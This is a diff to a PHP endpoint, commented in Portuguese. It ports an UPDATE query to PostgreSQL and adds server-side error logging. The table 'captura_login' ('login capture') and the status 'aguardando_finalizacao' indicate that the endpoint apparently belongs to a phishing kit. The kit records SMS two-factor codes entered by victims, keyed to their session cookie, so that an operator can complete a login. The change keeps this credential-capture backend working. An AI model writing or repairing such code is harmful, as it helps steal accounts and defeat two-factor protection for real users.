@@ -20,13 +20,19 @@ if (empty($sms_code) || strlen($sms_code) !== 6) {
 }
 
 try {
-    // Atualiza o registro correspondente ao session_id (cookie)
-    // e muda o status para 'aguardando_finalizacao'
-    $stmt = $pdo->prepare(
-        "UPDATE captura_login 
-         SET sms_code = ?, status = 'aguardando_finalizacao' 
-         WHERE session_id = ? ORDER BY id DESC LIMIT 1"
-    );
+    // 💡 CONSULTA CORRIGIDA PARA POSTGRESQL
+    // A subconsulta encontra o 'id' da linha mais recente para a sessão
+    // e o UPDATE principal usa esse 'id' para garantir que apenas uma linha seja alterada.
+    $sql = "UPDATE captura_login
+            SET sms_code = ?, status = 'aguardando_finalizacao'
+            WHERE id = (
+                SELECT id FROM captura_login
+                WHERE session_id = ?
+                ORDER BY id DESC
+                LIMIT 1
+            )";
+    
+    $stmt = $pdo->prepare($sql);
     $stmt->execute([$sms_code, $cookie_id]);
 
     if ($stmt->rowCount() > 0) {
@@ -36,7 +42,11 @@ try {
     }
 
 } catch (PDOException $e) {
+    // Logar o erro real para depuração no servidor
+    error_log("Erro no banco de dados: " . $e->getMessage());
+    
+    // Enviar resposta de erro 500 genérica
     http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'Erro no banco de dados.']);
+    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
 }
 ?>
